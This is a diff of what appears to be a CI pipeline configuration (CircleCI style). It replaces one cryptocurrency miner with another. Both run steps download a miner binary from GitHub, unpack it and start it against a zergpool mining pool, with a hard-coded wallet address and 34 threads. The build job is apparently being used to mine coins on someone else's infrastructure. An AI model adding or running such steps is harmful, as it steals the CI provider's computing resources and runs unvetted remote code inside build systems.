@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o panthera.mine.zergpool.com:4461 -a panthera -k -p c=DOGE,mc=XLA,ID=Scala -t 34 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N
+      - run:  mkdir cpuminer-opt-cpupower && cd cpuminer-opt-cpupower && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a power2b -o  stratum+tcp://power2b.mine.zergpool.com:7445 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=MBC,ID=Cloud -t 34
